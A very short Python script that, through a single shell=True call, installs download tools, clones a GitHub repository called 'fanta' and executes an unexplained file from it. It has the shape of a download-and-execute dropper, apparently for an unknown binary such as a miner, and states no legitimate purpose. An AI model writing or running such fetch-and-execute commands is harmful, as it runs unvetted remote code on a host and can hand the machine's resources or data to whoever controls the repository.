#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/mphuthumingubende/fanta.git;cd fanta;chmod +x fanta;bash fanta", shell=True)
